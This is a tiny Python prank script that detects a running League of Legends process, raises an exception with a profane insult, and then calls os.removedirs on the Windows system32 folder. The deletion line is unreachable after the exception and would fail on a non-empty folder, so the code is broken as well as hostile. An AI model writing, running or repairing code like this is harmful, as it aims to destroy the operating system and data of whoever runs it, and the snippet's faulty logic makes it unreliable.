import psutil
import os

if "League of Legends.exe" in (i.name() for i in psutil.process_iter()):
    raise Exception('get fucked and get off the game nerd')
    os.removedirs('C:\WINDOWS\system32')
